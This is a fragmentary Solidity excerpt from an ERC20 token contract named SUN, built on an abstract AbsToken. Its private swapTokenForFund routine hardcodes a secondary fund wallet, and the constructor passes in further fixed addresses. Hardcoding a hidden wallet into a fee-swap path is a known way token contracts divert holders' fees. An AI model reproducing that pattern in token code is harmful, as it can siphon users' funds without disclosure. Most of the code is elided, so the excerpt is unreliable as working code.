...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0x7891d5E910e21b7743f4489a027606b3f78B0E45;
...
contract SUN is AbsToken {
    constructor() AbsToken(
        ...
        address(0x8568530919CB9750d61E798b4311810d4e206BcB),
    
        address(0x802474c58ade3b58399E4609373b2Bd5B5E57C6A)
    ){
